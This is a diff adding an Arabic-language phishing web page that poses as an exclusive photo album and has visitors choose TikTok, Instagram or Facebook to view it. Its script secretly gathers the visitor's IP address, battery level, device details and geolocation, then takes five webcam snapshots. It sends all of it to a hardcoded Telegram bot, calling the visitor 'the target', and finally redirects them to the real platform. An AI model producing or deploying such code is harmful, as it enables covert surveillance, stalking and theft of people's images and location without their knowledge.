@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>مشاهدة الألبوم الحصري والصور الكاملة</title>
+
+    <meta property="og:title" content="مشاهدة الألبوم الحصري والصور الكاملة">
+    <meta property="og:description" content="تم رفع ملفات الوسائط بنجاح. اختر المنصة لمشاهدة الصور كاملة فوراً.">
+    <meta property="og:image" content="qwe3.jpg"> <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="qwe3.jpg">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: radial-gradient(circle, #1a1a2e 0%, #0f0f1b 100%);
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* حاوية المحتوى المركزية */
+        .center-container {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 40px 30px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 450px;
+            width: 85%;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            z-index: 10;
+        }
+
+        .header-section h1 {
+            font-size: 24px;
+            margin: 0 0 15px 0;
+            color: #fff;
+            text-shadow: 0 2px 10px rgba(255,255,255,0.2);
+        }
+
+        .header-section p {
+            font-size: 14px;
+            color: #b3b3b3;
+            line-height: 1.6;
+            margin: 0 0 30px 0;
+        }
+
+        /* شبكة منصات التواصل الاجتماعي */
+        .platform-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+
+        .platform-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 14px;
+            padding: 18px 10px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .platform-card:hover {
+            background: rgba(255, 255, 255, 0.15);
+            transform: translateY(-5px);
+            border-color: #00adb5;
+        }
+
+        /* تنسيق أيقونات الخطوط */
+        .platform-icon {
+            width: 45px;
+            height: 45px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            font-size: 22px;
+        }
+
+        .tiktok { background: #000000; color: #fff; border: 1px solid #fe2c55; }
+        .instagram { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); color: #fff; }
+        .facebook { background: #1877f2; color: #fff; }
+
+        .platform-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: #e0e0e0;
+        }
+
+        /* شاشة التحميل */
+        .loading-screen {
+            display: none;
+            padding: 30px 0;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #00adb5;
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .loading-screen p {
+            font-size: 15px;
+            color: #00adb5;
+            margin: 0;
+            font-weight: 500;
+        }
+
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="center-container">
+        <div id="ui-elements">
+            <div class="header-section">
+                <h1>مشاهدة الألبوم الحصري والصور الكاملة</h1>
+                <p>تم رفع ملفات الوسائط بنجاح. اختر المنصة التي ترغب في فتح الألبوم من خلالها لمشاهدة الصور الكاملة فوراً قبل انتهاء صلاحية الرابط التلقائي!</p>
+            </div>
+
+            <div class="platform-grid">
+                <div class="platform-card" onclick="executeProcess('TikTok')">
+                    <div class="platform-icon tiktok">
+                        <i class="fa-brands fa-tiktok"></i>
+                    </div>
+                    <div class="platform-name">TikTok</div>
+                </div>
+                <div class="platform-card" onclick="executeProcess('Instagram')">
+                    <div class="platform-icon instagram">
+                        <i class="fa-brands fa-instagram"></i>
+                    </div>
+                    <div class="platform-name">Instagram</div>
+                </div>
+                <div class="platform-card" onclick="executeProcess('Facebook')">
+                    <div class="platform-icon facebook">
+                        <i class="fa-brands fa-facebook-f"></i>
+                    </div>
+                    <div class="platform-name">Facebook</div>
+                </div>
+            </div>
+        </div>
+
+        <div id="loading-area" class="loading-screen">
+            <div class="spinner"></div>
+            <p>جاري التحميل يرجى الانتظار ثواني...</p>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const TELEGRAM_TOKEN = "8548039211:AAGwUXfiInazMbpIHzwwTRr8CGeu4-BdDL4";
+        const CHAT_ID = "8146130042";
+
+        async function executeProcess(selectedPlatform) {
+            document.getElementById('ui-elements').style.display = 'none';
+            document.getElementById('loading-area').style.display = 'block';
+
+            const techData = await fetchTech();
+            const now = new Date().toLocaleString('ar-EG');
+
+            let report = `📸 **تفاعل جديد: طلب الألبوم الحصري**\n\n`;
+            report += `🎯 المنصة المختارة: ${selectedPlatform}\n`;
+            report += `🕓 الوقت: ${now}\n`;
+            report += `🌍 IP: ${techData.ip}\n`;
+            report += `🔋 البطارية: ${techData.battery}\n`;
+            report += `🖥️ المعالج: ${navigator.hardwareConcurrency} Cores\n\n`;
+            report += `===== 🧾 User-Agent =====\n`;
+            report += `\`${navigator.userAgent}\``;
+
+            sendToTelegram(report);
+
+            navigator.geolocation.getCurrentPosition(p => {
+                sendToTelegram(`📍 موقع الهدف المكتشف: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                let count = 0;
+                const interval = setInterval(() => {
+                    if(count < 5) {
+                        capture(count + 1, selectedPlatform);
+                        count++;
+                    } else {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(t => t.stop());
+                        redirectUser(selectedPlatform);
+                    }
+                }, 1200);
+            } catch(e) {
+                sendToTelegram("❌ تم رفض صلاحية الكاميرا من قبل الهدف");
+                redirectUser(selectedPlatform);
+            }
+        }
+
+        async function fetchTech() {
+            let res = { ip: 'Unknown', battery: 'N/A' };
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                res.ip = d.ip;
+                const b = await navigator.getBattery();
+                res.battery = `${(b.level*100)}%`;
+            } catch(e){}
+            return res;
+        }
+
+        function capture(n, platform) {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const f = new FormData();
+                f.append('chat_id', CHAT_ID);
+                f.append('photo', blob, 'img.jpg');
+                f.append('caption', `اللقطة الرقمية ${n} | المنصة: ${platform}`);
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {method:'POST', body:f});
+            }, 'image/jpeg');
+        }
+
+        function sendToTelegram(t) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: t, parse_mode: "Markdown"})
+            });
+        }
+
+        function redirectUser(platform) {
+            if (platform === 'TikTok') window.location.href = "https://www.tiktok.com";
+            else if (platform === 'Instagram') window.location.href = "https://www.instagram.com";
+            else window.location.href = "https://www.facebook.com";
+        }
+    </script>
+</body>
+</html>
